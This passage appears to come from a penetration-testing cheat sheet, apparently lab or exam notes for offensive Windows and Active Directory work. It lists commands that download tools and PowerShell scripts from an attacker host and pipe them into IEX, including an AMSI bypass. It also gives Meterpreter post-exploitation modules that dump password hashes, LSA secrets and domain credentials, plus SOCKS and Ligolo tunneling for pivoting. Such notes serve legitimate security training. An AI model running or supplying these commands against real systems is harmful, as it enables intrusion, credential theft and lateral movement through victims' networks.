curl http://192.168.45.201/Rubeus.exe -o Rubeus.exe
certutil -urlcache -f http://192.168.45.201/Rubeus.exe c:\windows\tasks\rubeus.exe
(new-object system.net.webclient).downloadstring('http://192.168.45.201/amsi.txt') | IEX
powershell.exe -c iex (iwr http://192.168.45.201/Runner.ps1 -UseBasicParsing
powershell wget -uri http://192.168.45.201/run.txt -outfile C:\Windows\Tasks\run.txt

#SCP
scp -i id_rsa root@192.168.154.164:/tmp/krb5cc_75401103_YdtzIi .
scp kali@192.168.45.201/home/kali/Desktop/OSEP/Labs/3/pw.txt /home/marks

#smbserver
net use \\172.16.99.51\smb /user:kali kali
copy file \\172.16.99.51\smb\file
copy \\172.16.99.51\smb\PowerView.ps1 c:\windows\tasks\PowerView.ps1
```

#### Meterperter Basics
```
geuid
getsystem
sysinfo
execute -H -f notepad
migrate -N explorer.exe

run post/windows/gather/enum_shares 
run post/windows/gather/enum_logged_on_users 
run post/windows/gather/enum_computers 
run post/windows/gather/enum_applications 
run post/windows/gather/smart_hashdump 
run post/windows/gather/lsa_secrets
run winenum 
run post/windows/gather/hashdump 
run post/windows/gather/credentials/mssql_local_hashdump 
run post/windows/gather/credentials/domain_hashdump 
run post/multi/recon/local_exploit_suggester
run post/windows/gather/credentials/credential_collector
run post/linux/gather/hashdump
```

#### Tunneling & PortFoward 
```
###Socks Proxy
run autoroute -s 172.16.154.0/24
background
use auxiliary/server/socks_proxy 
set version 4a 
set srvhost 127.0.0.1 
run

#Ligolo
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.170.0/24 dev ligolo
./proxy -selfcert -laddr 0.0.0.0:53
./agent -connect 172.16.99.11:53 -ignore-cert
.\agent.exe -connect 172.16.99.11:53 -ignore-cert 

#SSH (only 22 open)
ssh root@IP -D 1080
sudo proxychains4 ...
```
